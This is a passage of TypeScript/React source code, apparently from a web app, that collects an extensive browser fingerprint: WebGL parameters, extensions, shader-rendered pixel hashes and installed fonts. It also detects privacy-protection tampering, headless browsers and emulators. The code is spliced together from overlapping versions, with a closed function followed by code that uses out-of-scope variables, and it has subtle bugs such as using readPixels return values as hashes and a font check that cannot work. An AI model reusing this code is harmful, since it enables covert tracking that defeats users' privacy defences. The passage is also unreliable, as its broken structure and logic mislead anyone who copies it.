        const isSoftwareRenderer = 
          unmaskedRenderer.toLowerCase().includes('swiftshader') ||
          unmaskedRenderer.toLowerCase().includes('llvmpipe') ||
          unmaskedRenderer.toLowerCase().includes('software') ||
          unmaskedRenderer.toLowerCase().includes('mesa') ||
          gpuRenderer.toLowerCase().includes('software') ||
          gpuRenderer.toLowerCase().includes('mesa');
        
        // Get all available extensions with their properties and capabilities
        const extensions = gl.getSupportedExtensions() || [];
        const extensionDetails = extensions.map(ext => {
          const extObj = gl.getExtension(ext);
          const properties = extObj ? Object.getOwnPropertyNames(extObj) : [];
          // For each extension, try to get specific information from it
          const paramValues: Record<string, any> = {};
          
          // For specific extensions, gather more detailed info
          if (ext === 'EXT_texture_filter_anisotropic' && extObj) {
            try {
              paramValues['MAX_TEXTURE_MAX_ANISOTROPY_EXT'] = gl.getParameter(extObj.MAX_TEXTURE_MAX_ANISOTROPY_EXT);
            } catch (e) { /* ignore errors */ }
          }
          
          return { name: ext, properties, paramValues };
        });
        
        // Gather WebGL2-specific information if available
        const webgl2Info = isWebGL2 ? {
          // Additional WebGL2 parameters
          parameters: {
            'MAX_3D_TEXTURE_SIZE': gl.getParameter(gl.MAX_3D_TEXTURE_SIZE),
            'MAX_DRAW_BUFFERS': gl.getParameter(gl.MAX_DRAW_BUFFERS),
            'MAX_COLOR_ATTACHMENTS': gl.getParameter(gl.MAX_COLOR_ATTACHMENTS),
            'MAX_SAMPLES': gl.getParameter(gl.MAX_SAMPLES),
            'MAX_TRANSFORM_FEEDBACK_SEPARATE_ATTRIBS': gl.getParameter(gl.MAX_TRANSFORM_FEEDBACK_SEPARATE_ATTRIBS),
            'MAX_UNIFORM_BUFFER_BINDINGS': gl.getParameter(gl.MAX_UNIFORM_BUFFER_BINDINGS),
            'MAX_UNIFORM_BLOCK_SIZE': gl.getParameter(gl.MAX_UNIFORM_BLOCK_SIZE),
            'MAX_VERTEX_UNIFORM_BLOCKS': gl.getParameter(gl.MAX_VERTEX_UNIFORM_BLOCKS),
            'MAX_FRAGMENT_UNIFORM_BLOCKS': gl.getParameter(gl.MAX_FRAGMENT_UNIFORM_BLOCKS)
          }
        } : null;
        
        // Collect all available WebGL parameters and capabilities
        const parameters: Record<string, any> = {};
        const parameterNames = [
          'VERSION', 'SHADING_LANGUAGE_VERSION', 'VENDOR', 'RENDERER',
          'MAX_TEXTURE_SIZE', 'MAX_VIEWPORT_DIMS', 'MAX_VERTEX_ATTRIBS',
          'MAX_VERTEX_UNIFORM_VECTORS', 'MAX_VARYING_VECTORS',
          'MAX_COMBINED_TEXTURE_IMAGE_UNITS', 'MAX_VERTEX_TEXTURE_IMAGE_UNITS',
          'MAX_TEXTURE_IMAGE_UNITS', 'MAX_FRAGMENT_UNIFORM_VECTORS',
          'ALIASED_LINE_WIDTH_RANGE', 'ALIASED_POINT_SIZE_RANGE',
          'RED_BITS', 'GREEN_BITS', 'BLUE_BITS', 'ALPHA_BITS',
          'DEPTH_BITS', 'STENCIL_BITS', 'SUBPIXEL_BITS',
          'MAX_RENDERBUFFER_SIZE', 'COMPRESSED_TEXTURE_FORMATS',
          // Additional parameters for more detailed fingerprinting
          'MAX_CUBE_MAP_TEXTURE_SIZE', 'MAX_RENDERBUFFER_SIZE'
        ];
        
        parameterNames.forEach(param => {
          try {
            const value = gl.getParameter((gl as any)[param]);
            
            // Convert TypedArrays to regular arrays for JSON serialization
            if (value && value.length !== undefined && typeof value !== 'string') {
              parameters[param] = Array.from(value);
            } else {
              parameters[param] = value;
            }
          } catch (e) {
            parameters[param] = `error: ${e instanceof Error ? e.message : String(e)}`;
          }
        });
        
        // Advanced WebGL capabilities test - render complex 3D scene and read pixels
        let renderingFingerprint = "";
        try {
          // Create vertex shader
          const vertexShader = gl.createShader(gl.VERTEX_SHADER);
          // Create fragment shader
          const fragmentShader = gl.createShader(gl.FRAGMENT_SHADER);
          
          if (vertexShader && fragmentShader) {
            // Vertex shader code
            const vsSource = `
              attribute vec4 aVertexPosition;
              varying highp vec2 vTextureCoord;
              void main(void) {
                gl_Position = aVertexPosition;
                vTextureCoord = aVertexPosition.xy * 0.5 + 0.5;
              }
            `;
            
            // Fragment shader code
            const fsSource = `
              precision highp float;
              varying highp vec2 vTextureCoord;
              void main(void) {
                float x = vTextureCoord.x;
                float y = vTextureCoord.y;
                float r = sin(x * 50.0) * cos(y * 50.0) * 0.5 + 0.5;
                float g = sin(x * 40.0 + 0.3) * cos(y * 40.0 + 0.3) * 0.5 + 0.5;
                float b = sin(x * 30.0 + 0.5) * cos(y * 30.0 + 0.5) * 0.5 + 0.5;
                gl_FragColor = vec4(r, g, b, 1.0);
              }
            `;
            
            // Setup shader program
            gl.shaderSource(vertexShader, vsSource);
            gl.shaderSource(fragmentShader, fsSource);
            gl.compileShader(vertexShader);
            gl.compileShader(fragmentShader);
            
            // Create shader program
            const shaderProgram = gl.createProgram();
            
            if (shaderProgram) {
              // Link shader program
              gl.attachShader(shaderProgram, vertexShader);
              gl.attachShader(shaderProgram, fragmentShader);
              gl.linkProgram(shaderProgram);
              gl.useProgram(shaderProgram);
              
              // Check shader compilation status
              const vertexCompiled = gl.getShaderParameter(vertexShader, gl.COMPILE_STATUS);
              const fragmentCompiled = gl.getShaderParameter(fragmentShader, gl.COMPILE_STATUS);
              const programLinked = gl.getProgramParameter(shaderProgram, gl.LINK_STATUS);
              
              // Log errors if compilation failed
              if (!vertexCompiled) console.error(gl.getShaderInfoLog(vertexShader));
              if (!fragmentCompiled) console.error(gl.getShaderInfoLog(fragmentShader));
              if (!programLinked) console.error(gl.getProgramInfoLog(shaderProgram));
              
              // Setup vertex buffer
              const positionBuffer = gl.createBuffer();
              gl.bindBuffer(gl.ARRAY_BUFFER, positionBuffer);
              
              // Define a square (two triangles) with positions
              const positions = [
                -1.0, -1.0,
                 1.0, -1.0,
                -1.0,  1.0,
                 1.0,  1.0
              ];
              
              // Push positions to buffer
              gl.bufferData(gl.ARRAY_BUFFER, new Float32Array(positions), gl.STATIC_DRAW);
              
              // Tell WebGL how to pull out the positions from the buffer
              const positionAttributeLocation = gl.getAttribLocation(shaderProgram, "aVertexPosition");
              gl.enableVertexAttribArray(positionAttributeLocation);
              gl.vertexAttribPointer(positionAttributeLocation, 2, gl.FLOAT, false, 0, 0);
              
              // Clear canvas and draw
              gl.clearColor(0.0, 0.0, 0.0, 1.0);
              gl.clear(gl.COLOR_BUFFER_BIT);
              gl.drawArrays(gl.TRIANGLE_STRIP, 0, 4);
              
              // Read pixel data as fingerprint
              const pixels = new Uint8Array(4);
              gl.readPixels(100, 100, 1, 1, gl.RGBA, gl.UNSIGNED_BYTE, pixels);
              
              // Create a hash from a few sample pixels
              const renderHash = [
                gl.readPixels(50, 50, 1, 1, gl.RGBA, gl.UNSIGNED_BYTE, new Uint8Array(4)),
                gl.readPixels(150, 75, 1, 1, gl.RGBA, gl.UNSIGNED_BYTE, new Uint8Array(4)),
                gl.readPixels(100, 125, 1, 1, gl.RGBA, gl.UNSIGNED_BYTE, new Uint8Array(4))
              ];
              
              // Convert pixel data to fingerprint string
              renderingFingerprint = Array.from(pixels).join(',');
            }
          }
        } catch (renderError) {
          console.warn("Error during WebGL rendering test:", renderError);
          renderingFingerprint = "RENDER_ERROR";
        }
        
        // Detect if WebGL is being instrumented/tampered with
        let isWebGLProtected = false;
        let protectionType = 'none';
        
        // Test 1: Check if return values are manipulated
        try {
          // Check if the renderer strings are generic
          if (
            unmaskedRenderer.includes('WebGL') && unmaskedRenderer.length < 20 ||
            gpuRenderer.includes('WebGL') && gpuRenderer.length < 20
          ) {
            isWebGLProtected = true;
            protectionType = 'generic_renderer';
          }
          
          // Test 2: Repeated parameter reads should be identical
          const test1 = gl.getParameter(gl.VERSION);
          const test2 = gl.getParameter(gl.VERSION);
          if (test1 !== test2) {
            isWebGLProtected = true;
            protectionType = 'inconsistent_parameters';
          }
          
          // Test 3: Check if WEBGL_debug_renderer_info is blocked
          if (debugInfo === null && navigator.userAgent.includes('Chrome')) {
            // Chrome typically supports this extension, so its absence is suspicious
            isWebGLProtected = true;
            protectionType = 'blocked_debug_info';
          }
        } catch (protectionError) {
          console.warn("Error during WebGL protection detection:", protectionError);
        }
        
        // Combine all data into a comprehensive WebGL fingerprint
        const webglFingerprint = {
          version: parameters['VERSION'],
          glVersion: isWebGL2 ? 'WebGL 2.0' : 'WebGL 1.0',
          vendor: gpuVendor,
          renderer: gpuRenderer,
          unmaskedVendor,
          unmaskedRenderer,
          shadingLanguageVersion: parameters['SHADING_LANGUAGE_VERSION'],
          extensionsCount: extensions.length,
          contextAttributes: actualContextAttributes,
          contextLost,
          renderingHash: renderingFingerprint,
          // Result of detection
          protectionDetected: isWebGLProtected,
          protectionType,
          isSoftwareRenderer
        };
        
        // Store the full WebGL fingerprint data
        setUserInfo(prev => ({
          ...prev,
          webglVendor: unmaskedVendor,
          webglRenderer: unmaskedRenderer,
          webglFingerprint: hashString(JSON.stringify(webglFingerprint)),
          webglFingerprintData: {
            // Basic information
            ...webglFingerprint,
            // Detailed technical data
            parameters,
            extensions: extensionDetails,
            webgl2Specific: webgl2Info,
            // Full raw data collection
            rawData: {
              extensionsList: extensions,
              allParameters: parameters,
              contextAttributes: actualContextAttributes
            },
            // Collection metadata
            collectionTimestamp: new Date().toISOString()
          }
        }));
      } catch (e) {
        console.error('WebGL fingerprinting error:', e);
        // Store error information
        setUserInfo(prev => ({
          ...prev,
          webglFingerprint: "ERROR",
          webglFingerprintError: {
            message: e instanceof Error ? e.message : String(e),
            stack: e instanceof Error ? e.stack : undefined,
            timestamp: new Date().toISOString()
          }
        }));
      }
    };
        
        // For WebGL2, get additional parameters
        if (isWebGL2 && gl2) {
          const webgl2Params = [
            'MAX_3D_TEXTURE_SIZE', 'MAX_DRAW_BUFFERS', 'MAX_COLOR_ATTACHMENTS',
            'MAX_SAMPLES', 'MAX_TRANSFORM_FEEDBACK_SEPARATE_ATTRIBS',
            'MAX_TRANSFORM_FEEDBACK_INTERLEAVED_COMPONENTS',
            'MAX_UNIFORM_BUFFER_BINDINGS', 'MAX_UNIFORM_BLOCK_SIZE',
            'MAX_VARYING_COMPONENTS', 'MAX_ARRAY_TEXTURE_LAYERS',
            'UNIFORM_BUFFER_OFFSET_ALIGNMENT'
          ];
          
          webgl2Params.forEach(param => {
            try {
              const value = gl2.getParameter((gl2 as any)[param]);
              
              if (value && value.length !== undefined && typeof value !== 'string') {
                parameters[param] = Array.from(value);
              } else {
                parameters[param] = value;
              }
            } catch (e) {
              parameters[param] = `error: ${e}`;
            }
          });
        }
        
        // Generate a unique rendering to further identify GPU behavior
        // This creates a visual fingerprint that differs based on GPU hardware and drivers
        const createRenderFingerprint = () => {
          try {
            // Create vertex and fragment shaders with complex math operations
            const vertexShaderSource = `
              attribute vec2 a_position;
              varying vec2 v_position;
              
              void main() {
                v_position = a_position;
                gl_Position = vec4(a_position, 0.0, 1.0);
              }
            `;
            
            const fragmentShaderSource = `
              precision highp float;
              varying vec2 v_position;
              
              float generatePattern(vec2 position) {
                float x = position.x * 17.0;
                float y = position.y * 23.0;
                float v = sin(x) * cos(y) + sin(x * 3.1) * cos(y * 1.7) + sin(y * 4.3) * cos(x * 2.9);
                v = v * 0.5 + 0.5; // Normalize to [0, 1]
                return v;
              }
              
              void main() {
                vec2 position = v_position * 2.0;
                float r = generatePattern(position + vec2(0.1, 0.3));
                float g = generatePattern(position + vec2(0.7, -0.2));
                float b = generatePattern(position + vec2(-0.3, 0.8));
                gl_FragColor = vec4(r, g, b, 1.0);
              }
            `;
            
            // Create and compile shaders
            const vertexShader = gl.createShader(gl.VERTEX_SHADER);
            const fragmentShader = gl.createShader(gl.FRAGMENT_SHADER);
            
            if (!vertexShader || !fragmentShader) {
              throw new Error("Failed to create shaders");
            }
            
            gl.shaderSource(vertexShader, vertexShaderSource);
            gl.shaderSource(fragmentShader, fragmentShaderSource);
            gl.compileShader(vertexShader);
            gl.compileShader(fragmentShader);
            
            // Create program and link shaders
            const program = gl.createProgram();
            if (!program) {
              throw new Error("Failed to create program");
            }
            
            gl.attachShader(program, vertexShader);
            gl.attachShader(program, fragmentShader);
            gl.linkProgram(program);
            gl.useProgram(program);
            
            // Check for shader compilation and program linking errors
            const vertexSuccess = gl.getShaderParameter(vertexShader, gl.COMPILE_STATUS);
            const fragmentSuccess = gl.getShaderParameter(fragmentShader, gl.COMPILE_STATUS);
            const programSuccess = gl.getProgramParameter(program, gl.LINK_STATUS);
            
            if (!vertexSuccess || !fragmentSuccess || !programSuccess) {
              const vertexLog = gl.getShaderInfoLog(vertexShader);
              const fragmentLog = gl.getShaderInfoLog(fragmentShader);
              const programLog = gl.getProgramInfoLog(program);
              throw new Error(`Shader compilation failed: Vertex: ${vertexLog}, Fragment: ${fragmentLog}, Program: ${programLog}`);
            }
            
            // Create a buffer for the vertices
            const positionBuffer = gl.createBuffer();
            gl.bindBuffer(gl.ARRAY_BUFFER, positionBuffer);
            
            // Create vertex data (a rectangle covering the canvas)
            const positions = new Float32Array([
              -1.0, -1.0,
               1.0, -1.0,
              -1.0,  1.0,
               1.0,  1.0
            ]);
            gl.bufferData(gl.ARRAY_BUFFER, positions, gl.STATIC_DRAW);
            
            // Tell the shader program how to read the buffer
            const positionLocation = gl.getAttribLocation(program, "a_position");
            gl.enableVertexAttribArray(positionLocation);
            gl.vertexAttribPointer(positionLocation, 2, gl.FLOAT, false, 0, 0);
            
            // Draw the rectangle
            gl.clearColor(0, 0, 0, 1);
            gl.clear(gl.COLOR_BUFFER_BIT);
            gl.drawArrays(gl.TRIANGLE_STRIP, 0, 4);
            
            // Read back a sample of the pixels (this is hardware-dependent)
            const pixels = new Uint8Array(16 * 16 * 4);
            gl.readPixels(0, 0, 16, 16, gl.RGBA, gl.UNSIGNED_BYTE, pixels);
            
            // Return a sample of pixels as the fingerprint
            // Only use a subset to keep size reasonable
            return Array.from(pixels.slice(0, 64));
          } catch (e) {
            console.warn("Render fingerprint generation failed:", e);
            return null;
          }
        };
        
        // Get render fingerprint
        const renderFingerprint = createRenderFingerprint();
        
        // Check if WebGL context is lost or if canvas is tainted
        const contextLost = gl.isContextLost?.() || false;
        
        // Check for emulator/virtualization
        const renderer = unmaskedRenderer || gl.getParameter(gl.RENDERER) || '';
        const vendor = unmaskedVendor || gl.getParameter(gl.VENDOR) || '';
        
        // Comprehensive detection of virtualized environments, emulators, and automated testing
        const emulationPatterns = [
          // Common virtualization GPUs
          /SwiftShader/i, /llvmpipe/i, /VirtualBox/i, /VMware/i, 
          /SVGA3D/i, /VMWARE/i, /Software Rasterizer/i, 
          
          // Mobile emulator GPUs
          /Adreno.*[Ee]mulator/i, /Intel.*[Ee]mulator/i,
          
          // Common test automation frameworks
          /Headless/i, /Chrome\s+Remote/i, /Software\s+OpenGL/i,
          
          // Cloud rendering services
          /ANGLE/i, /D3D11/i
        ];
        
        const isEmulator = emulationPatterns.some(pattern => 
          pattern.test(renderer) || pattern.test(vendor)
        );
        
        if (isEmulator) {
          console.warn("Emulator/Virtualization detected in WebGL:", renderer);
        }
        
        // Assemble the complete WebGL fingerprint with all collected data
        const webglInfo = {
          // Core WebGL information
          version: gl.getParameter(gl.VERSION),
          glVersion: isWebGL2 ? '2.0' : '1.0',
          vendor,
          renderer,
          unmaskedVendor,
          unmaskedRenderer,
          shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
          
          // Detailed capabilities
          parameters,
          extensionsCount: extensions.length,
          extensionsList: extensions,
          extensionDetails,
          contextAttributes: gl.getContextAttributes(),
          contextLost,
          
          // Fingerprinting results
          renderFingerprint,
          canvas: {
            width: canvas.width,
            height: canvas.height,
            clientWidth: canvas.clientWidth,
            clientHeight: canvas.clientHeight
          },
          
          // Security and detection flags
          isEmulator,
          isWebGL2,
          
          // Hardware acceleration information
          hardwareAccelerated: !(/SwiftShader|Software|SVGA3D/i.test(renderer)),
          
          // Estimated graphics tier (basic estimate based on renderer string)
          graphicsTier: /nvidia|radeon|geforce|rx|rtx|gtx/i.test(renderer) ? 'high' : 
                       (/intel|amd|mali-t/i.test(renderer) ? 'medium' : 'low'),
          
          // Timestamp for when the fingerprint was generated
          timestamp: new Date().toISOString()
        };
        
        // Update user info with comprehensive WebGL data
        setUserInfo(prev => ({
          ...prev,
          webglFingerprint: JSON.stringify(webglInfo),
          hardwareInfo: {
            ...prev.hardwareInfo,
            gpu: unmaskedRenderer || renderer || 'unknown',
            gpuVendor: unmaskedVendor || vendor || 'unknown',
            isWebGL2,
            maxTextureSize: parameters['MAX_TEXTURE_SIZE'],
            extensionCount: extensions.length,
            contextLost,
            glVersion: isWebGL2 ? '2.0' : '1.0',
            shadingLanguageVersion: parameters['SHADING_LANGUAGE_VERSION'],
          }
        }));
        
        // Set emulator detection flag if necessary
        if (isEmulator) {
          setUserInfo(prev => ({
            ...prev,
            isEmulator: true,
            emulatorDetails: {
              source: 'webgl',
              renderer,
              vendor
            }
          }));
        }
      } catch (e) {
        console.error('WebGL fingerprinting error:', e);
        
        // Still update with error information
        setUserInfo(prev => ({
          ...prev,
          webglFingerprint: JSON.stringify({
            error: true,
            message: e.message,
            timestamp: new Date().toISOString()
          })
        }));
      }
    };
    
    // Enhanced font detection
    const detectFonts = () => {
      const fontList = [
        'Arial', 'Courier New', 'Georgia', 'Times New Roman', 
        'Verdana', 'Tahoma', 'Impact', 'Comic Sans MS',
        // Extended font list can detect more OS-specific fonts
        'Segoe UI', 'Calibri', 'Cambria', 'Consolas', 'Wingdings', 'Roboto',
        'San Francisco', 'Helvetica Neue', 'Ubuntu', 'Droid Sans'
      ];
      
      const availableFonts = fontList.filter(font => {
        const testElement = document.createElement('span');
        testElement.style.fontFamily = `'${font}', monospace`;
        document.body.appendChild(testElement);
        const computedStyle = window.getComputedStyle(testElement);
        const detected = computedStyle.fontFamily !== 'monospace';
        document.body.removeChild(testElement);
        return detected;
      });
      
      // Check for emulator-like font patterns
      const hasEmulatorFonts = availableFonts.length < 3 || 
                               (availableFonts.length === 4 && 
                                availableFonts.includes('Arial') && 
                                availableFonts.includes('Times New Roman'));
      
      if (hasEmulatorFonts) {
        console.warn("Limited font selection, possible emulator");
        setUserInfo(prev => ({
          ...prev,
          isEmulator: true
